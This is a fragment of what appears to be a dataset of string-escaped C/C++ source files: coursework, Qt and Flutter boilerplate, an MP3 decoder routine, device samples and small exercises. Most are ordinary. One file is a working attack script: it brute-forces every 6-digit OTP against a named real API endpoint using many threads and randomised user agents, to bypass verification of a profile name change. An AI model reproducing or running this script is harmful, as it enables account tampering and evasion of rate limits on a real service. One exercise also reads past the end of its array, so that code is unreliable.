}\n\n    client->livrerPanier();\n}\n// TO DO TP4. Il est interdit de faire une boucle\nbool Compagnie::chercherClient(const shared_ptr<Client> &client) const\n{\n\n    auto it = find_if(clients_.begin(), clients_.end(), [&](const auto &c)\n                      { return client->getNom() == c->getNom(); });\n\n    if (it != clients_.end())\n    {\n        return true;\n    }\n    return false;\n}\n// TO DO TP4. Il est interdit de faire une boucle\nbool Compagnie::chercherProduit(const shared_ptr<Produit> &produit) const\n{\n    auto it = find_if(produits_.begin(), produits_.end(), [&](const auto &prod)\n                      { return produit == prod; });\n    if (it != produits_.end())\n    {\n        return true;\n    }\n    return false;\n}\n\nbool Compagnie::encherir(const shared_ptr<Client> &client,\n                         const shared_ptr<Produit> &produit, double montant) const\n{\n    // v\u00e9rifier que le client  est dans la compagnie et le produitAuxEncheres\n    bool condition = dynamic_cast<ProduitAuxEncheres *>(produit.get()) &&\n                     chercherClient(client);\n\n    if (condition)\n    {\n        dynamic_cast<ProduitAuxEncheres *>(produit.get())->mettreAJourEnchere(client, montant);\n        return true;\n    }\n    return false;\n}\n\nvoid Compagnie::acheter(const shared_ptr<Client> &client,\n                        const shared_ptr<Produit> &produit)\n{\n\n    if (chercherClient(client) && chercherProduit(produit))\n    {\n        client->acheterProduit(produit);\n    }\n}\n// TO DO TP4\nunsigned Compagnie::combienProduitEnVente()\n{\n    return fournisseurs_.size();\n}\n// TO DO TP4\nshared_ptr<Client> Compagnie::chercherClientPlusAchat()\n{\n    auto it = max_element(clientsChiffreAffaires_.begin(), clientsChiffreAffaires_.end(), [](const auto &paire1, const auto &paire2)\n                          { return paire1.second < paire2.second; });\n    return it->first;\n}\n",
    "#include \"BinarySort.h\"\r\n#include <QThread>\r\n#include <QTimer>\r\n\r\nBinarySort::BinarySort(MainWindow *visual) : visual(visual), array(visual->getArray())\r\n{\r\n}\r\n\r\nvoid BinarySort::startSort()\r\n{\r\n    QThread *thread = new QThread;\r\n    this->moveToThread(thread);\r\n\r\n    connect(thread, &QThread::started, this, &BinarySort::runSort);\r\n    connect(this, &BinarySort::finished, thread, &QThread::quit);\r\n    connect(thread, &QThread::finished, thread, &QThread::deleteLater);\r\n\r\n    thread->start();\r\n}\r\n\r\nvoid BinarySort::runSort()\r\n{\r\n    QThread::msleep(500);\r\n\r\n    int n = array.n;\r\n    for (int i = 1; i < n; i++) {\r\n        if (array.get(i) < array.get(i - 1)) {\r\n            int temp = array.get(i);\r\n            int low = 0, high = i - 1;\r\n            while (low <= high) {\r\n                int mid = (low + high) / 2;\r\n                if (temp < array.get(mid))\r\n                    high = mid - 1;\r\n                else\r\n                    low = mid + 1;\r\n            }\r\n\r\n            for (int j = i - 1; j >= high + 1; j--) {\r\n                array.set(array.get(j), j + 1);\r\n\r\n                QThread::msleep(5);\r\n                visual->update();\r\n            }\r\n            array.set(temp, high + 1);\r\n        }\r\n\r\n        QThread::msleep(5);\r\n        visual->update();\r\n    }\r\n\r\n    QThread::msleep(2000);\r\n    emit finished();\r\n}\r\n",
    "/* ------------------------------------------------------------------\n * Copyright (C) 1998-2009 PacketVideo\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either\n * express or implied.\n * See the License for the specific language governing permissions\n * and limitations under the License.\n * -------------------------------------------------------------------\n */\n/*\n------------------------------------------------------------------------------\n\n   PacketVideo Corp.\n   MP3 Decoder Library\n\n   Filename: mdct_18.cpp\n\n     Date: 09/21/2007\n\n------------------------------------------------------------------------------\n REVISION HISTORY\n\n\n Description:\n\n------------------------------------------------------------------------------\n INPUT AND OUTPUT DEFINITIONS\n\nInput\n    int32 vec[],        input vector of length 18\n    int32 *history      input for overlap and add, vector updated with\n                        next overlap and add values\n    const int32 *window sine window used in the mdct, three types are allowed\n                        noraml, start and stop\nReturns\n    none                mdct computation in-place\n\n\n------------------------------------------------------------------------------\n FUNCTION DESCRIPTION\n\n    Returns the mdct of length 18 of the input vector, as well as the overlap\n    vector for next iteration ( on history[])\n\n------------------------------------------------------------------------------\n REQUIREMENTS\n\n\n------------------------------------------------------------------------------\n REFERENCES\n\n------------------------------------------------------------------------------\n PSEUDO-CODE\n\n------------------------------------------------------------------------------\n*/\n\n#if ( !defined(PV_ARM_GCC_V5) && !defined(PV_ARM_GCC_V4) && !defined(PV_ARM_V5) && !defined(PV_ARM_V4) )\n/*----------------------------------------------------------------------------\n; INCLUDES\n----------------------------------------------------------------------------*/\n\n#include \"pv_mp3dec_fxd_op.h\"\n#include \"pvmp3_mdct_18.h\"\n\n\n/*----------------------------------------------------------------------------\n; MACROS\n; Define module specific macros here\n----------------------------------------------------------------------------*/\n\n\n/*----------------------------------------------------------------------------\n; DEFINES\n; Include all pre-processor statements here. Include conditional\n; compile variables also.\n----------------------------------------------------------------------------*/\n\n/*----------------------------------------------------------------------------\n; LOCAL FUNCTION DEFINITIONS\n; Function Prototype declaration\n----------------------------------------------------------------------------*/\n\n/*----------------------------------------------------------------------------\n; LOCAL STORE/BUFFER/POINTER DEFINITIONS\n; Variable declaration - defined here and used outside this module\n----------------------------------------------------------------------------*/\nconst int32 cosTerms_dct18[9] =\n{\n    Qfmt(0.50190991877167f),   Qfmt(0.51763809020504f),   Qfmt(0.55168895948125f),\n    Qfmt(0.61038729438073f),   Qfmt(0.70710678118655f),   Qfmt(0.87172339781055f),\n    Qfmt(1.18310079157625f),   Qfmt(1.93185165257814f),   Qfmt(5.73685662283493f)\n};\n\n\nconst int32 cosTerms_1_ov_cos_phi[18] =\n{\n\n    Qfmt1(0.50047634258166f),  Qfmt1(0.50431448029008f),  Qfmt1(0.51213975715725f),\n    Qfmt1(0.52426456257041f),  Qfmt1(0.54119610014620f),  Qfmt1(0.56369097343317f),\n    Qfmt1(0.59284452371708f),  Qfmt1(0.63023620700513f),  Qfmt1(0.67817085245463f),\n\n    Qfmt2(0.74009361646113f),  Qfmt2(0.82133981585229f),  Qfmt2(0.93057949835179f),\n    Qfmt2(1.08284028510010f),  Qfmt2(1.30656296487638f),  Qfmt2(1.66275476171152f),\n    Qfmt2(2.31011315767265f),  Qfmt2(3.83064878777019f),  Qfmt2(11.46279281302667f)\n};\n\n/*----------------------------------------------------------------------------\n; EXTERNAL FUNCTION REFERENCES\n; Declare functions defined elsewhere and referenced in this module\n----------------------------------------------------------------------------*/\n\n/*----------------------------------------------------------------------------\n; EXTERNAL GLOBAL STORE/BUFFER/POINTER REFERENCES\n; Declare variables used in this module but defined elsewhere\n----------------------------------------------------------------------------*/\n\n/*----------------------------------------------------------------------------\n; FUNCTION CODE\n----------------------------------------------------------------------------*/\n\n\n\nvoid pvmp3_mdct_18(int32 vec[], int32 *history, const int32 *window",
    "/**************************************************************************/\n/*                                                                        */\n/* Copyright (c) 2013-2023 Orbbec 3D Technology, Inc                      */\n/*                                                                        */\n/* PROPRIETARY RIGHTS of Orbbec 3D Technology are involved in the         */\n/* subject matter of this material. All manufacturing, reproduction, use, */\n/* and sales rights pertaining to this subject matter are governed by the */\n/* license agreement. The recipient of this software implicitly accepts   */\n/* the terms of the license.                                              */\n/*                                                                        */\n/**************************************************************************/\n#include \"rclcpp/rclcpp.hpp\"\n#include \"astra_camera/ob_context.h\"\n\nvoid DeviceConnectedCallback(const openni::DeviceInfo* device_info) {\n  std::cout << \"Device connected: \" << device_info->getName() << std::endl;\n  auto device = std::make_shared<openni::Device>();\n  auto uri = device_info->getUri();\n  std::cout << \"URI: \" << uri << std::endl;\n  device->open(uri);\n  char serial_number[64];\n  int data_size = sizeof(serial_number);\n  device->getProperty(openni::OBEXTENSION_ID_SERIALNUMBER, serial_number, &data_size);\n  std::cout << \"Serial number: \" << serial_number << std::endl;\n  device->close();\n}\n\nint main() {\n  openni::OpenNI::initialize();\n  auto disconnected_cb = [](const openni::DeviceInfo* device_info) {\n    std::cout << \"device \" << device_info->getUri() << \" disconnected\" << std::endl;\n  };\n  auto ob_context = std::make_unique<astra_camera::OBContext>(disconnected_cb);\n  auto device_info_list = ob_context->queryDeviceList();\n  for (auto& device_info : device_info_list) {\n    DeviceConnectedCallback(&device_info);\n  }\n  return 0;\n}\n",
    "#include \"map.h\"\n#include \"gdal_priv.h\"\n#include \"ogrsf_frmts.h\"\n\n\n// Initializes the Map object with default values for map boundaries\n// and initializes the current path.\nMap::Map() {\n    m_currentPath = QString(PROJECT_ROOT_DIR);\n\n    minX = 180.0f;\n    maxX = 0.0f;\n    minY = 180.0f;\n    maxY = 0.0f;\n}\n\nMap::~Map() {}\n\nQVector<iPoint>& Map::getPointLayers() {\n    return m_pointLayers;\n}\n\nQVector<iLine>& Map::getLineLayers() {\n    return m_lineLayers;\n}\n\nQVector<iPolygon>& Map::getPolygonLayers() {\n    return m_poligonLayers;\n}\n\nQVector<iPolygon>& Map::getBorderLayers() {\n    return m_borderLayers;\n}\n\nQString Map::getCurrentPath() const {\n    return m_currentPath;\n}\n\nQString Map::getLayersDir() const {\n    return m_layersDir;\n}\n\n// Loads layer styles (such as color, transparency, point size, line width) from\n// the specified JSON file into the layersStyle shared pointer.\nvoid Map::loadStyle(QString filePath) {\n\n    QFile file(m_currentPath + filePath);\n\n    if (!file.exists()) {\n        qDebug() << \"File does not exist:\" << filePath;\n        return;\n    }\n\n    if (!file.open(QIODevice::ReadOnly)) {\n        qDebug() << \"File is not readable:\" << filePath;\n        return;\n    }\n\n    QByteArray fileData = file.readAll();\n    file.close();\n\n    layersStyle = std::make_shared<layersInfo>();\n    layersStyle->setInfo(fileData);\n\n}\n\n\n// Loads map layers from shapefiles in the specified directory.\nvoid Map::loadMap(QString layersDir){\n    GDALAllRegister();\n\n    m_layersDir = layersDir;\n    QDir directory(m_currentPath + m_layersDir);\n    QStringList filters;\n    filters << \"*.shp\";\n    directory.setNameFilters(filters);\n\n    QFileInfoList fileList = directory.entryInfoList();\n\n    for (const QFileInfo &fileInfo : fileList) {\n        QString filePath = fileInfo.absoluteFilePath();\n        QString layerName = fileInfo.completeBaseName();\n\n        if (!fileInfo.exists() || !fileInfo.isFile()) {\n            qDebug() << \"File does not exist or is not a file:\" << layerName;\n            continue;\n        }\n        if (!fileInfo.isReadable()) {\n            qDebug() << \"File is not readable:\" << layerName;\n            continue;\n        }\n\n        GDALDataset *dataset = static_cast<GDALDataset*>(GDALOpenEx(filePath.toStdString().c_str(), GDAL_OF_VECTOR, nullptr, nullptr, nullptr));\n\n        if (!dataset) {\n            qDebug() << \"Failed to open file: \" + layerName + \".shp\";\n            continue;\n        }\n\n        OGRLayer* ogrLayer = dataset->GetLayer(0);\n        layaerDistribution(ogrLayer, layerName);\n\n        GDALClose(dataset);\n    }\n\n}\n\n\n// Distributes layers based on their geometry type.\n// If the layer name contains \"border\", only its outline will be drawn without filling the polygon.\nvoid Map::layaerDistribution(OGRLayer* ogrLayer, QString layerName) {\n\n    OGRFeature* feature;\n    ogrLayer->ResetReading();\n\n    if ((feature = ogrLayer->GetNextFeature()) != nullptr) {\n        OGRGeometry* geometry = feature->GetGeometryRef();\n        QString layerType;\n        ogrLayer->ResetReading();\n\n        if (!geometry) {\n            return;\n        }\n\n        OGRwkbGeometryType type = wkbFlatten(geometry->getGeometryType());\n        layerType = OGRGeometryTypeToName(type);\n\n        if (layerType == \"Point\") {\n            loadPoint(ogrLayer, layerName);\n        }\n        else if (layerType == \"Polygon\") {\n            if (layerName.contains(\"border\", Qt::CaseInsensitive)) {\n                loadPolygon(ogrLayer, layerName, false);\n            }\n            else {\n                loadPolygon(ogrLayer, layerName, true);\n            }\n        }\n        else if (layerType == \"Multi Polygon\") {\n            if (layerName.contains(\"border\", Qt::CaseInsensitive)) {\n                loadMultiPolygon(ogrLayer, layerName, false);\n            }\n            else {\n                loadMultiPolygon(ogrLayer, layerName, true);\n            }\n        }\n        else if (layerType == \"Line String\") {\n            loadLine(ogrLayer, layerName);\n        }\n        else {\n            qDebug() << \"Layer type: \" << layerType << \" is unknown.\";\n        }\n    }\n}\n\n\nvoid Map::loadPoint(OGRLayer* layer, const QString &name) {\n    iPoint points;\n    OGRFeature *feature;\n\n    while ((feature = layer->GetNextFeature()) != nullptr) {\n        OGRGeometry *geometry = feature->GetGeometryRef();\n        if (geometry && wkbFlatten(geometry->getGeometryType()) == wkbPoint) {\n            OGRPoint *ogrPoint = static_cast<OGRPoint*>(geometry);\n            points.addPoint(Point(ogrPoint->getX(), ogrPoint->getY()));\n        }\n        OGRFeature::DestroyFeature(feature);\n    }\n\n    points.name = name;\n    lInfo info = layersStyle->getInfo(name);\n    points.color = info.color;\n    points.color.setAlpha(info.alpha);\n    points.pointSize = info.pointSize ? info.pointSize : 5.0f;\n    points.isVisible = true;\n    m_pointLayers.push_back(points);\n}\n\n\nvoid Map::loadLine(OGRLayer* layer, const QString &name) {\n    iLine lineObj;\n    OGRFeature *feature;\n\n    while ((feature = lay",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"crypto\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nclass Stack{\npublic:\n    bool isValid(string s) {\n        stack<char> st;\n        int n = s.size();\n        for (int i = 0; i < n; i++) {\n            if (s[i] == '(' || s[i] == '{' || s[i] == '[') {\n                st.push(s[i]);\n            } else if (s[i] == ')' || s[i] == '}' || s[i] == ']') {\n                if (st.empty()){\n               return false; \n               }           \n                char top = st.top();\n                if ((s[i] == ')' && top == '(') || (s[i] == '}' && top == '{') || (s[i] == ']' && top == '[')) {\n                    st.pop();\n                } else {\n                    return false;\n                }\n            }\n        }\n        return st.empty();\n    }\n};\n\nint main() {\n    string s;\n    cout << \"Enter the string: \";\n    cin >> s; \n    \n    Stack solution;\n    bool result = solution.isValid(s);\n    \n    if (result) {\n        cout << \"This string is valid.\" << endl;\n    } else {\n        cout << \"This string is not valid.\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n\nvoid Input();\nvoid CheckHighestNumber(int size);\nint GetHighestNumber(int array[], int size);\n\nint main(int argc, char* argv[])\n{\n    Input();\n    \n    return 0;\n}\n\nvoid Input()\n{\n    int arraySize = 0;\n\n    std::cout << \"Insert array size: \";\n    std::cin >> arraySize;\n\n    if(arraySize < 1)\n    {\n        std::cout << \"Array size must be above 1\" << std::endl << \"================================\" << std::endl;\n        Input();\n    }\n\n    CheckHighestNumber(arraySize);\n}\n\nvoid CheckHighestNumber(int size)\n{\n    int* numbers = new int[size];\n    \n    for(int i = 0; i < size; i++)\n    {\n        std::cout << \"Number #\" << i + 1 << \": \";\n        std::cin >> numbers[i];\n    }\n    \n    const int highestNumber = GetHighestNumber(numbers, size);\n\n    std::cout << \"Highest number is: \" << highestNumber;\n}\n\nint GetHighestNumber(int array[], int size)\n{\n    int highestNumber = array[0];\n\n    for(int i = 0; i <= size; i++)\n    {\n        if(array[i] > highestNumber)\n            highestNumber = array[i];\n    }\n\n    return highestNumber;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Logger.h\"\n#include <format>\n#include <chrono>\n#include <thread>\n\nLogger::Logger(LogLevel level, std::string name, std::ostream* stream) {\n    this->level = level;\n    this->name = name;\n    this->stream = stream;\n}\n\n\nLogger& Logger::log(LogLevel level, std::string message) {\n    if (this->level <= level) {\n        std::chrono::time_point<std::chrono::system_clock> time = std::chrono::system_clock::now();\n        std::string timeString = std::format(\"{0:%c}\", time);\n        *stream << \"[\" << timeString << \"] [\" << std::this_thread::get_id() << \"] [\"  << name << \"] \" << text[(int) level] << \" \" << message << std::endl;\n    }\n    return *this;\n}\n\nLogger& Logger::debug(std::string message) {\n    log(LogLevel::DEBUG, message);\n    return *this;\n}\n\nLogger& Logger::info(std::string message) {\n    log(LogLevel::INFO, message);\n    return *this;\n}\n\nLogger& Logger::warn(std::string message) {\n    log(LogLevel::WARN, message);\n    return *this;\n}\n\nLogger& Logger::error(std::string message) {\n    log(LogLevel::ERROR, message);\n    return *this;\n}\n\nLogger& Logger::fatal(std::string message) {\n    log(LogLevel::FATAL, message);\n    return *this;\n}\n\nLogger& Logger::setLevel(LogLevel level) {\n    this->level = level;\n    return *this;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_painting_game\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_toy\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff/*\n*\u67e5\u627e\u5df2\u8fde\u63a5\u6267\u884c\u5668\n*/\n\n#include <iostream>\n#include \"actuatorcontroller.h\"\n#include <thread>\n#include <signal.h>\n#include <string.h>\nusing namespace std;\n\n\nint main(int argc, char *argv[])\n{\n    //Initialize the controller\n    ActuatorController * pController = ActuatorController::initController();\n    //ec Define an error type, ec==0x00 means no error, ec will be passed to pcontroller-> lookupActuators(ec) by reference,\n    //when the error occurs, ec value will be modified by SDK to the corresponding error code\n    Actuator::ErrorsDefine ec;\n    //Find the connected actuators and return the UnifiedID of all actuators found.\n    //UnifiedID is a structure composed of the actuator ID (actuatorID) and IP(ipAddress) of ECB(ECU)\n    std::vector<ActuatorController::UnifiedID> uIDArray = pController->lookupActuators(ec);\n    //If the size of the uIDArray is greater than zero, the connected actuators have been found\n    if(uIDArray.size() > 0)\n    {\n        for(auto uID : uIDArray)\n        {\n            cout << \"Actuator ID: \"<<(int)uID.actuatorID << \" IP address: \" << uID.ipAddress.c_str() << endl;\n        }\n    }\n    else\n    {\n        //ec=0x803 Communication with ECB(ECU) failed\n        //ec=0x802 Communication with actuator failed\n        cout << \"Connected error code:\" << hex << ec << endl;\n    }\n\n    return 0;\n}\n",
    "#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <random>\n#include <sstream>\n#include <chrono>\n#include <thread>\n#include <mutex>\n\nusing json = nlohmann::json;\nusing namespace cpr;\nusing namespace std;\n\nmutex cout_mutex;\n\nstring generate_user_agent() {\n    // Vector of common browsers and their versions\n    const vector<pair<string, vector<string>>> browsers = {\n        {\"Chrome\", {\"91.0.4472.124\", \"92.0.4515.107\", \"93.0.4577.63\", \"94.0.4606.71\", \"95.0.4638.69\"}},\n        {\"Firefox\", {\"89.0\", \"90.0\", \"91.0\", \"92.0\", \"93.0\"}},\n        {\"Safari\", {\"14.1.1\", \"14.1.2\", \"15.0\", \"15.1\", \"15.2\"}},\n        {\"Edge\", {\"91.0.864.59\", \"92.0.902.67\", \"93.0.961.52\", \"94.0.992.47\", \"95.0.1020.30\"}}\n    };\n\n    // Vector of common operating systems\n    const vector<string> operating_systems = {\n        \"Windows NT 10.0; Win64; x64\",\n        \"Macintosh; Intel Mac OS X 10_15_7\",\n        \"X11; Linux x86_64\",\n        \"Windows NT 6.1; Win64; x64\",\n        \"Macintosh; Intel Mac OS X 10_14_6\"\n    };\n\n    // Use current time as seed for random generator\n    unsigned seed = chrono::system_clock::now().time_since_epoch().count();\n    mt19937_64 generator(seed);\n\n    // Randomly select a browser and its version\n    uniform_int_distribution<int> browser_dist(0, browsers.size() - 1);\n    int browser_index = browser_dist(generator);\n    const auto& browser = browsers[browser_index];\n\n    uniform_int_distribution<int> version_dist(0, browser.second.size() - 1);\n    int version_index = version_dist(generator);\n\n    // Randomly select an operating system\n    uniform_int_distribution<int> os_dist(0, operating_systems.size() - 1);\n    int os_index = os_dist(generator);\n\n    // Construct the user agent string\n    ostringstream ua_stream;\n    ua_stream << \"Mozilla/5.0 (\" << operating_systems[os_index] << \") \";\n\n    if (browser.first == \"Chrome\" || browser.first == \"Safari\" || browser.first == \"Edge\") {\n        ua_stream << \"AppleWebKit/537.36 (KHTML, like Gecko) \";\n    }\n\n    if (browser.first == \"Chrome\") {\n        ua_stream << \"Chrome/\" << browser.second[version_index] << \" Safari/537.36\";\n    } else if (browser.first == \"Firefox\") {\n        ua_stream << \"Firefox/\" << browser.second[version_index];\n    } else if (browser.first == \"Safari\") {\n        ua_stream << \"Version/\" << browser.second[version_index] << \" Safari/605.1.15\";\n    } else if (browser.first == \"Edge\") {\n        ua_stream << \"Chrome/\" << browser.second[version_index] << \" Safari/537.36 Edg/\" << browser.second[version_index];\n    }\n\n    return ua_stream.str();\n}\n\nvoid attempt_otp_range(int start, int end, const string& new_name, Header headers) {\n    for (int i = start; i <= end; ++i) {\n        string otp = to_string(i);\n        otp.insert(0, 6 - otp.length(), '0'); // Pad with zeros if necessary\n\n        json otp_payload = {\n            {\"leadname\", new_name},\n            {\"authevent\", \"NAME_CHANGE\"},\n            {\"authotp\", otp}\n        };\n\n        headers[\"sec-ch-ua\"] = generate_user_agent();\n        auto otp_response = Patch(Url{\"https://api.habit.yoga/lead/profileupdate\"},\n                                  Header{headers},\n                                  Body{otp_payload.dump()});\n\n        {\n            lock_guard<mutex> lock(cout_mutex);\n            cout << otp_response.text << ':' << otp << '\\n';\n        }\n\n        if (otp_response.status_code == 200) {\n            break; // Stop if successful\n        }\n    }\n}\n\nint main(int argc, char** argv) {\n    if (argc < 3) {\n        cout << \"Usage: \" << argv[0] << \" <token> <new name>\" << endl;\n        return 1;\n    }\n\n    int num_threads; // Or any number you see fit\n    const unsigned int recco_threads = thread::hardware_concurrency() * 10;\n    cout << \"You have \" << thread::hardware_concurrency() << \" cores available.\" << endl;\n    string num_threads_str;\n    cout << \"Enter number of threads [default=\" << recco_threads << \"]: \";\n    getline(cin, num_threads_str);\n    if (num_threads_str.empty()) {\n        num_threads = recco_threads;\n    } else {\n        num_threads = stoi(num_threads_str);\n    }\n\n    const int range_per_thread = 1000000 / num_threads; // Assuming OTPs range from 0 to 999999\n\n    // Extract the token and new name from the command line arguments\n    const string TOKEN = argv[1];\n    string new_name = argv[2];\n    // If there are more than 3 arguments concatenate the rest into the new name\n    for (int i = 3; i < argc; i++) {\n        new_name += ' ';\n        new_name += argv[i];\n    }\n\n    Header headers = {\n        {\"accept\", \"application/json\"},\n        {\"accept-language\", \"en-US,en;q=0.9\"},\n        {\"authorization\", TOKEN},\n        {\"cache-control\", \"no-cache\"},\n        {\"content-type\", \"application/json\"},\n        {\"pragma\", \"no-cache\"},\n        {\"priority\", \"u=1, i\"},\n        {\"sec-ch-ua\", generate_user_agent()},\n        {\"sec-ch-ua-mobile\", \"?0\"},\n        {\"sec-ch-ua-platform\", \"\\\"Windows\\\"\"},\n        {\"sec-fetch-dest\", \"empty\"},\n        {\"",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nint myfind(vector<int> number, int low, int high, int x, int father);\nint myfind2(vector<int> number, int low, int high, int x, int father);\n\nint main()\n{\n\tint group = 0;\n\tcin >> group;\n\tvector<vector<int>> sizeAndx;\n\tvector<vector<int>> number;\n\tfor (int i = 0; i < group; i++)\n\t{\n\t\tint size = 0;\n\t\tint x = 0;\n\t\tvector<int> temp1;\n\t\tvector<int> temp2;\n\t\tcin >> size >> x;\n\t\ttemp2.push_back(size);\n\t\ttemp2.push_back(x);\n\t\tfor (int j = 0; j < size; j++)\n\t\t{\n\t\t\tint a = 0;\n\t\t\tcin >> a;\n\t\t\ttemp1.push_back(a);\n\t\t}\n\t\tsizeAndx.push_back(temp2);\n\t\tnumber.push_back(temp1);\n\t}\n\tfor (int i = 0; i < group; i++)\n\t{\n\t\tif (myfind2(number[i], 0, sizeAndx[i][0] - 1, sizeAndx[i][1], 0) == sizeAndx[i][1])\n\t\t{\n\t\t\tcout << \"success, father is \" << myfind(number[i], 0, sizeAndx[i][0] - 1, sizeAndx[i][1], 0) << endl;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout<<\"not found, father is \"<< myfind(number[i], 0, sizeAndx[i][0] - 1, sizeAndx[i][1], 0) << endl;\n\t\t}\n\t}\n}\n\nint myfind(vector<int> number,int low,int high,int x,int father)\n{\n\tint mid = (low + high) / 2;\n\tif (number[mid] == x)\n\t\treturn number[father];\n\telse if (low >= high)\n\t\treturn number[mid];\n\telse if (number[mid] < x)\n\t{\n\t\treturn myfind(number, mid + 1, high, x, mid);\n\t}\n\telse if (number[mid] > x)\n\t{\n\t\treturn myfind(number, low, mid - 1, x, mid);\n\t}\n}\n\nint myfind2(vector<int> number, int low, int high, int x, int father)\n{\n\tint mid = (low + high) / 2;\n\tif (number[mid] == x)\n\t\treturn x;\n\telse if (low >= high)\n\t\treturn -1;\n\telse if (number[mid] < x)\n\t{\n\t\treturn myfind2(number, mid + 1, high, x, mid);\n\t}\n\telse if (number[mid] > x)\n\t{\n\t\treturn myfind2(number, low, mid - 1, x, mid);\n\t}\n}",
